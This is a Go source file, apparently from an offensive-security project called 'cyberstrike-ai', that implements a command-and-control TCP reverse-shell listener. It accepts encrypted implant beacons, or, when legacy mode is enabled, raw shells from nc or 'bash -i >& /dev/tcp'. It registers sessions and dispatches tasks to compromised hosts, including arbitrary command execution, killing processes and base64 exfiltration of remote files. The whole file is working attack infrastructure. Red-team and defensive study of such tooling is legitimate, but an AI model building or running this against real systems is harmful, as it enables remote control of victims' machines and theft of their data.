package c2

import (
	"bufio"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"cyberstrike-ai/internal/database"

	"go.uber.org/zap"
)

// TCPReverseListener 监听 TCP 端口，等待目标机反弹连接。
// 默认仅接受加密 TCP Beacon：连接后先发送魔数 CSB1，再经 AES-GCM 解密且校验 ImplantToken 后才登记会话。
// 可选经典模式（config.allow_legacy_shell=true）：纯交互式 raw shell，与 nc / bash -i >& /dev/tcp 兼容，无鉴权，仅建议内网实验。
// 任务派发（经典模式）：同步 exec —— 收到 task 时直接 send 命令字节并读取输出（带结束标记）。
type TCPReverseListener struct {
	rec     *database.C2Listener
	cfg     *ListenerConfig
	manager *Manager
	logger  *zap.Logger

	mu        sync.Mutex
	listener  net.Listener
	stopCh    chan struct{}
	conns     map[string]*tcpReverseConn // session_id → 连接
	stopOnce  sync.Once
}

// tcpReverseConn 单个反弹会话的运行时状态
type tcpReverseConn struct {
	sessionID string
	conn      net.Conn
	reader    *bufio.Reader
	writeMu   sync.Mutex // 序列化 write，避免并发 task 写入
	taskMode  int32      // 原子标志: 0=空闲(handleConn读), 1=任务中(runTaskOnConn独占读)
}

// NewTCPReverseListener 工厂方法（注册到 ListenerRegistry["tcp_reverse"]）
func NewTCPReverseListener(ctx ListenerCreationCtx) (Listener, error) {
	return &TCPReverseListener{
		rec:     ctx.Listener,
		cfg:     ctx.Config,
		manager: ctx.Manager,
		logger:  ctx.Logger,
		stopCh:  make(chan struct{}),
		conns:   make(map[string]*tcpReverseConn),
	}, nil
}

// Type 返回类型常量
func (l *TCPReverseListener) Type() string { return string(ListenerTypeTCPReverse) }

// Start 启动 TCP 监听，accept 在独立 goroutine 中运行
func (l *TCPReverseListener) Start() error {
	addr := fmt.Sprintf("%s:%d", l.rec.BindHost, l.rec.BindPort)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		if isAddrInUse(err) {
			return ErrPortInUse
		}
		return err
	}
	l.mu.Lock()
	l.listener = ln
	l.mu.Unlock()
	go l.acceptLoop()
	go l.taskDispatcherLoop()
	return nil
}

// Stop 关闭监听 + 所有活动连接
func (l *TCPReverseListener) Stop() error {
	l.stopOnce.Do(func() {
		close(l.stopCh)
	})
	l.mu.Lock()
	if l.listener != nil {
		_ = l.listener.Close()
		l.listener = nil
	}
	for sid, c := range l.conns {
		_ = c.conn.Close()
		delete(l.conns, sid)
	}
	l.mu.Unlock()
	return nil
}

func (l *TCPReverseListener) acceptLoop() {
	for {
		l.mu.Lock()
		ln := l.listener
		l.mu.Unlock()
		if ln == nil {
			return
		}
		conn, err := ln.Accept()
		if err != nil {
			select {
			case <-l.stopCh:
				return
			default:
			}
			if isClosedConnErr(err) {
				return
			}
			l.logger.Warn("tcp_reverse accept failed", zap.Error(err))
			continue
		}
		go l.handleConn(conn)
	}
}

// handleConn 先识别加密 TCP Beacon（魔数 CSB1 + AES-GCM + Token）；未通过则按配置拒绝或走经典 shell。
func (l *TCPReverseListener) handleConn(conn net.Conn) {
	br := bufio.NewReader(conn)
	remote := conn.RemoteAddr().String()

	_ = conn.SetReadDeadline(time.Now().Add(tcpBeaconPeekTimeout))
	prefix, peekErr := br.Peek(4)
	if peekErr == nil && len(prefix) == 4 && string(prefix) == tcpBeaconMagic {
		if _, err := br.Discard(4); err != nil {
			_ = conn.Close()
			return
		}
		_ = conn.SetReadDeadline(time.Time{})
		l.handleTCPBeaconSession(conn, br)
		return
	}

	if !l.cfg.AllowLegacyShell {
		l.logger.Debug("tcp_reverse rejected an unencrypted connection", zap.String("remote", remote))
		_ = conn.Close()
		return
	}

	_ = conn.SetReadDeadline(time.Time{})
	l.handleShellConn(conn, br)
}

// handleShellConn 经典裸 TCP 反弹 shell（与 nc/bash /dev/tcp 兼容）；需监听器显式开启 allow_legacy_shell。
func (l *TCPReverseListener) handleShellConn(conn net.Conn, br *bufio.Reader) {
	remote := conn.RemoteAddr().String()
	host, _, _ := net.SplitHostPort(remote)

	// 用 listener+remote_ip 生成稳定 implant_uuid，使同一来源的重连复用同一会话
	uuidSeed := fmt.Sprintf("%s|%s", l.rec.ID, host)
	hash := sha256.Sum256([]byte(uuidSeed))
	implantUUID := hex.EncodeToString(hash[:8])

	checkin := ImplantCheckInRequest{
		ImplantUUID:   implantUUID,
		Hostname:      "tcp_" + host,
		Username:      "unknown",
		OS:            "unknown",
		Arch:          "unknown",
		InternalIP:    host,
		SleepSeconds:  0, // 交互式不需要 sleep
		JitterPercent: 0,
		Metadata: map[string]interface{}{
			"transport": "tcp_reverse",
			"remote":    remote,
		},
	}
	session, err := l.manager.IngestCheckIn(l.rec.ID, checkin)
	if err != nil {
		l.logger.Warn("tcp_reverse failed to register the session", zap.Error(err))
		_ = conn.Close()
		return
	}

	tc := &tcpReverseConn{
		sessionID: session.ID,
		conn:      conn,
		reader:    br,
	}
	l.mu.Lock()
	if old, exists := l.conns[session.ID]; exists {
		_ = old.conn.Close()
	}
	l.conns[session.ID] = tc
	l.mu.Unlock()

	defer func() {
		l.mu.Lock()
		if cur, ok := l.conns[session.ID]; ok && cur == tc {
			delete(l.conns, session.ID)
			_ = l.manager.MarkSessionDead(session.ID)
		}
		l.mu.Unlock()
		_ = conn.Close()
	}()

	// 主循环：检测连接存活 + 读取非任务期间的 unsolicited 输出
	// 注意：必须统一使用 tc.reader 读取，避免与 runTaskOnConn 的 bufio.Reader 产生数据分裂
	buf := make([]byte, 4096)
	for {
		select {
		case <-l.stopCh:
			return
		default:
		}
		// 任务执行中，runTaskOnConn 独占读取权，主循环暂停
		if atomic.LoadInt32(&tc.taskMode) == 1 {
			time.Sleep(100 * time.Millisecond)
			continue
		}
		_ = conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		n, err := tc.reader.Read(buf)
		if n > 0 {
			// 收到数据也刷新心跳
			_ = l.manager.DB().TouchC2Session(session.ID, string(SessionActive), time.Now())
			if atomic.LoadInt32(&tc.taskMode) == 0 {
				l.manager.publishEvent("info", "task", session.ID, "",
					"stdout(unsolicited)", map[string]interface{}{
						"output": string(buf[:n]),
					})
			}
		}
		if err != nil {
			if err == io.EOF || isClosedConnErr(err) {
				return
			}
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				// 读超时 = 连接仍存活但无数据，刷新心跳防止看门狗误判
				_ = l.manager.DB().TouchC2Session(session.ID, string(SessionActive), time.Now())
				continue
			}
			return
		}
	}
}

// taskDispatcherLoop 周期扫描所有活动会话的任务队列，下发 exec/shell 类型的同步命令
func (l *TCPReverseListener) taskDispatcherLoop() {
	t := time.NewTicker(500 * time.Millisecond)
	defer t.Stop()
	for {
		select {
		case <-l.stopCh:
			return
		case <-t.C:
			l.mu.Lock()
			snapshot := make([]*tcpReverseConn, 0, len(l.conns))
			for _, c := range l.conns {
				snapshot = append(snapshot, c)
			}
			l.mu.Unlock()
			for _, c := range snapshot {
				envelopes, err := l.manager.PopTasksForBeacon(c.sessionID, 5)
				if err != nil || len(envelopes) == 0 {
					continue
				}
				for _, env := range envelopes {
					go l.runTaskOnConn(c, env)
				}
			}
		}
	}
}

// runTaskOnConn 把一条 task 转成 raw shell 命令发送，通过结束标记读输出
func (l *TCPReverseListener) runTaskOnConn(c *tcpReverseConn, env TaskEnvelope) {
	startedAt := NowUnixMillis()
	cmd, ok := buildTCPCommand(TaskType(env.TaskType), env.Payload)
	if !ok {
		l.reportTaskResult(env.TaskID, startedAt, false, "", "tcp_reverse listener does not support this task type: "+env.TaskType, "", "")
		return
	}

	// 独占读取权：通知 handleConn 主循环暂停
	atomic.StoreInt32(&c.taskMode, 1)
	defer atomic.StoreInt32(&c.taskMode, 0)

	// 等待 handleConn 循环退出读取（给 100ms 让正在进行的 Read 超时/完成）
	time.Sleep(150 * time.Millisecond)

	// 排空 buffer 中残留的 bash 提示符等数据
	drainStaleData(c.reader, c.conn)

	endMark := fmt.Sprintf("__C2_DONE_%s__", env.TaskID)
	wrapped := fmt.Sprintf("%s\necho %s\n", strings.TrimSpace(cmd), endMark)
	c.writeMu.Lock()
	_ = c.conn.SetWriteDeadline(time.Now().Add(15 * time.Second))
	if _, err := c.conn.Write([]byte(wrapped)); err != nil {
		c.writeMu.Unlock()
		l.reportTaskResult(env.TaskID, startedAt, false, "", "Failed to write command: "+err.Error(), "", "")
		return
	}
	c.writeMu.Unlock()

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	output, err := readUntilMarker(ctx, c.reader, endMark)
	if err != nil {
		l.reportTaskResult(env.TaskID, startedAt, false, output, "Failed to read result: "+err.Error(), "", "")
		return
	}
	cleaned := cleanShellOutput(output, cmd)
	if TaskType(env.TaskType) == TaskTypeDownload {
		if errMsg := detectDownloadShellError(cleaned); errMsg != "" {
			l.reportTaskResult(env.TaskID, startedAt, false, cleaned, errMsg, "", "")
			return
		}
	}
	l.reportTaskResult(env.TaskID, startedAt, true, cleaned, "", "", "")
}

// reportTaskResult 适配 Manager.IngestTaskResult，统一报告路径
func (l *TCPReverseListener) reportTaskResult(taskID string, startedAtMS int64, success bool, output, errMsg, blobB64, blobSuffix string) {
	_ = l.manager.IngestTaskResult(TaskResultReport{
		TaskID:     taskID,
		Success:    success,
		Output:     output,
		Error:      errMsg,
		BlobBase64: blobB64,
		BlobSuffix: blobSuffix,
		StartedAt:  startedAtMS,
		EndedAt:    NowUnixMillis(),
	})
}

// buildTCPCommand 把 (TaskType + payload) 转成 raw shell 命令字符串。
// 仅支持 TCP 反弹模式可直接执行的最简任务类型；download 通过 base64 输出文本结果，
// upload/screenshot 等需要二进制传输的能力建议使用 http_beacon。
func buildTCPCommand(t TaskType, payload map[string]interface{}) (string, bool) {
	switch t {
	case TaskTypeExec, TaskTypeShell:
		cmd, _ := payload["command"].(string)
		return cmd, true
	case TaskTypePwd:
		return "pwd 2>/dev/null || cd", true
	case TaskTypeLs:
		path, _ := payload["path"].(string)
		if strings.TrimSpace(path) == "" {
			path = "."
		}
		return "ls -la " + shellQuote(path), true
	case TaskTypePs:
		return "ps -ef 2>/dev/null || ps aux", true
	case TaskTypeKillProc:
		pid, _ := payload["pid"].(float64)
		if pid <= 0 {
			return "", false
		}
		return fmt.Sprintf("kill -9 %d", int(pid)), true
	case TaskTypeCd:
		path, _ := payload["path"].(string)
		if strings.TrimSpace(path) == "" {
			return "", false
		}
		return "cd " + shellQuote(path) + " && pwd", true
	case TaskTypeDownload:
		path, _ := payload["remote_path"].(string)
		if strings.TrimSpace(path) == "" {
			return "", false
		}
		q := shellQuote(path)
		return fmt.Sprintf(
			`f=%s; if [ ! -e "$f" ]; then echo 'C2_DOWNLOAD_ERR: no such file or directory' >&2; exit 1; elif [ -d "$f" ]; then echo 'C2_DOWNLOAD_ERR: is a directory' >&2; exit 1; elif [ ! -r "$f" ]; then echo 'C2_DOWNLOAD_ERR: permission denied' >&2; exit 1; else base64 "$f" 2>/dev/null || base64 < "$f"; fi`,
			q,
		), true
	case TaskTypeExit:
		return "exit 0", true
	}
	return "", false
}

// readUntilMarker 从 reader 持续读，直到匹配 endMarker；返回去掉标记后的输出
func readUntilMarker(ctx context.Context, r *bufio.Reader, marker string) (string, error) {
	var sb strings.Builder
	buf := make([]byte, 4096)
	deadline := time.Now().Add(60 * time.Second)
	for {
		select {
		case <-ctx.Done():
			return sb.String(), ctx.Err()
		default:
		}
		if time.Now().After(deadline) {
			return sb.String(), fmt.Errorf("timeout")
		}
		n, err := r.Read(buf)
		if n > 0 {
			sb.Write(buf[:n])
			if idx := strings.Index(sb.String(), marker); idx >= 0 {
				return strings.TrimRight(sb.String()[:idx], "\r\n"), nil
			}
		}
		if err != nil {
			return sb.String(), err
		}
	}
}

func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
}

// detectDownloadShellError 识别 download 任务中 shell/base64 返回的错误信息。
func detectDownloadShellError(output string) string {
	trimmed := strings.TrimSpace(output)
	if trimmed == "" {
		return ""
	}
	lower := strings.ToLower(trimmed)
	markers := []string{
		"c2_download_err:",
		"no such file",
		"permission denied",
		"is a directory",
		"cannot open",
		"not a regular file",
	}
	for _, m := range markers {
		if strings.Contains(lower, m) {
			return trimmed
		}
	}
	return ""
}

func isAddrInUse(err error) bool {
	if err == nil {
		return false
	}
	return strings.Contains(strings.ToLower(err.Error()), "address already in use") ||
		strings.Contains(strings.ToLower(err.Error()), "bind: only one usage")
}

func isClosedConnErr(err error) bool {
	if err == nil {
		return false
	}
	es := err.Error()
	return strings.Contains(es, "use of closed network connection") ||
		strings.Contains(es, "connection reset by peer")
}

// drainStaleData 用短超时读取并丢弃 buffer 中残留的 shell 提示符等数据
func drainStaleData(r *bufio.Reader, conn net.Conn) {
	buf := make([]byte, 4096)
	for {
		_ = conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
		n, err := r.Read(buf)
		if n == 0 || err != nil {
			break
		}
	}
	// 恢复较长的读超时
	_ = conn.SetReadDeadline(time.Time{})
}

var shellPromptRe = regexp.MustCompile(`(?m)^.*?(bash[\-\d.]*\$|[\$#%>]\s*)$`)

// cleanShellOutput 过滤 bash 提示符行和命令回显，返回干净的命令输出
func cleanShellOutput(raw, cmd string) string {
	lines := strings.Split(raw, "\n")
	var cleaned []string
	cmdTrimmed := strings.TrimSpace(cmd)
	echoSkipped := false
	for _, line := range lines {
		trimmed := strings.TrimRight(line, "\r \t")
		// 跳过命令回显行（bash 会 echo 回输入的命令）
		if !echoSkipped && cmdTrimmed != "" && strings.Contains(trimmed, cmdTrimmed) {
			echoSkipped = true
			continue
		}
		// 跳过纯 shell 提示符行
		if shellPromptRe.MatchString(trimmed) && len(strings.TrimSpace(shellPromptRe.ReplaceAllString(trimmed, ""))) == 0 {
			continue
		}
		cleaned = append(cleaned, line)
	}
	result := strings.Join(cleaned, "\n")
	return strings.TrimSpace(result)
}
